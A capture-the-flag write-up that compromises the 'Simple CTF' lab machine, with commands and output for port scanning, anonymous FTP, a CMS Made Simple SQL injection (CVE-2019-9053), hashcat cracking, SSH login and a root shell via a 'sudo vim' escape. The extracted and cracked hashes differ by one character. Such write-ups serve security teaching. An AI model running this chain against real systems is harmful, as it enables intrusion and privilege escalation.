# Simple CTF Challenge Write-Up

## Overview

This walkthrough documents the exploitation path used to compromise the Simple CTF machine, recover the user flag, and escalate privileges to root. The challenge combines classic enumeration, FTP access, a CMS Made Simple SQL injection, privilege escalation through a sudo rule, and a final root shell.

The target machine exposes multiple services, including FTP, a web application, and SSH. The key vulnerability is a CMS Made Simple SQL injection affecting versions <= 2.2.8 (CVE-2019-9053).

---

## 1. Initial Reconnaissance

### Port Scanning

The first task is to identify which ports are open and what services are running.

```bash
nmap -sV 10.113.174.240
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-26 11:28 -0400
Nmap scan report for 10.113.174.240
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

We can confirm the following:

- FTP is running on port 21
- HTTP is running on port 80
- SSH is exposed on port 2222

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. FTP Enumeration

The FTP service is a common early-source of information, especially when anonymous access is enabled.

```bash
ftp 10.113.174.240
```

### Credentials Used

```text
Username: anonymous
Password: (empty / null)
```

Once connected, the attacker downloads the file `ForMitch.txt`.

```ftp
ftp> get ForMitch.txt
```

### File Contents

```text
Dammit man... you're the worst dev I've seen. You set the same pass for the system user, and the password is so weak... I cracked it in seconds. Gosh... what a mess!
```

This strongly suggests a reused password and hints at a credential reuse issue between the system account and another service. It also implies the user `mitch` may be the target account.

![Image Placeholder: FTP file content](./assets/ftp-file.png)

---

## 3. Web Application Review

### Application URL

```text
http://10.113.174.240/simple
http://10.113.174.240/simple/login.php
```

There was no obvious immediate vulnerability in the web UI, but the CMS version was displayed as `2.2.8`, which immediately suggested a search for known vulnerabilities.

The application is running a CMS Made Simple instance and matches the following known exploit:

- CMS Made Simple <= 2.2.8
- CVE-2019-9053

This is an SQL injection vulnerability that can recover user credentials from the database.

![Image Placeholder: CMS login page](./assets/login-page.png)

---

## 4. SQL Injection Exploit

### Vulnerability Identification

The challenge notes explicitly mention the exploitation path:

```text
CMS Made Simple <= 2.2.8 (CVE-2019-9053)
```

This vulnerability allows an attacker to enumerate database content and retrieve password hashes.

The extracted database data included:

```text
username: mitch
password salt: 1dac0d92e9fa6bb2
password hash: 0c01f4468bd75d7a84c7eb73846e8d96b
```

### Cracking the Hash

The password hash was cracked using `hashcat` with mode `-m 20`, which corresponds to a salted MD5 hash.

```bash
hashcat -m 20 '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' /usr/share/wordlists/rockyou.txt
```

### Recovered Password

```text
mitch: secret
```

This gives a valid credential pair for the SSH user account.

![Image Placeholder: Hashcat crack result](./assets/hashcat-result.png)

---

## 5. SSH Access as mitch

With the recovered credentials, we authenticate to the SSH service on port 2222.

```bash
ssh mitch@10.113.174.240 -p 2222
```

### User Login

```bash
mitch@10.113.174.240's password: secret
```

Once inside the box, we enumerate the home directory.

```bash
ls
```

### Relevant Output

```text
user.txt
```

The user flag is retrieved directly.

```bash
cat user.txt
```

This completes the user-level foothold and obtains the first flag.

![Image Placeholder: SSH login](./assets/ssh-login.png)

---

## 6. Privilege Escalation Preparation

The next step is to determine whether the compromised user can run commands as root without a password.

```bash
sudo -l
```

### Sudo Output

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

This is a classic privilege escalation path. `vim` can be used to spawn a shell as root. Since the user has passwordless sudo access to the editor, a root shell can be obtained by invoking the editor and escaping to a shell.

> Important: A user with `sudo vim` access can often execute shell commands via the editor by changing the shell and spawning a command prompt.

---

## 7. Privilege Escalation to Root

### Exploit Sequence

```bash
sudo vim
```

Inside the `vim` process, use the following command:

```vim
:set shell=/bin/sh
:shell
```

This invokes a shell using `/bin/sh` from within the `vim` process, which runs with root privileges because it was launched via `sudo`.

### Verification

```bash
id
```

### Result

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirms that the attacker has obtained a root shell.

![Image Placeholder: Root shell](./assets/root-shell.png)

---

## 8. Final Root Access

Once root privileges are confirmed, the attacker can read the root flag or perform any desired post-exploitation actions.

Because the challenge is solved, the root shell is the final step in the escalation chain.

---

## 9. Summary of the Exploit Chain

1. Enumerated the target with `nmap`
2. Confirmed FTP, HTTP, and SSH services were active
3. Logged into anonymous FTP and read `ForMitch.txt`
4. Found a password hint and possible password reuse
5. Identified the CMS Made Simple SQL injection vulnerability (CVE-2019-9053)
6. Dumped the user database and recovered the hash for `mitch`
7. Cracked the password using `hashcat`
8. Accessed SSH with `mitch:secret`
9. Retrieved the user flag
10. Used `sudo -l` to discover root access to `vim`
11. Spawned a root shell via the editor
12. Confirmed root access with `id`

---

## 10. Key Takeaways

- Anonymous FTP access can reveal password hints and sensitive files.
- Password reuse is a common weakness in CTFs and real systems.
- Old CMS versions may contain public SQL injection vulnerabilities.
- Hash cracking is often needed when database hashes are exposed.
- `sudo` misconfigurations are one of the easiest ways to achieve privilege escalation.
- Editing tools such as `vim` can become root shells when allowed through passwordless sudo.

> Important: The challenge demonstrates a realistic privilege escalation flow: web exploitation, credential recovery, SSH access, and then local privilege escalation through a misconfigured sudo rule.

---

## 11. Relevant Commands

```bash
nmap -sV 10.113.174.240
ftp 10.113.174.240
get ForMitch.txt
cat ForMitch.txt
hashcat -m 20 '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' /usr/share/wordlists/rockyou.txt
ssh mitch@10.113.174.240 -p 2222
ls
cat user.txt
sudo -l
sudo vim
:set shell=/bin/sh
:shell
id
```

---

## Final Result

The machine was successfully compromised by exploiting a CMS Made Simple SQL injection, recovering the password for the `mitch` user, obtaining the user flag, and escalating privileges to root using `sudo vim`.

![Image Placeholder: Final challenge completion](./assets/final-result.png)

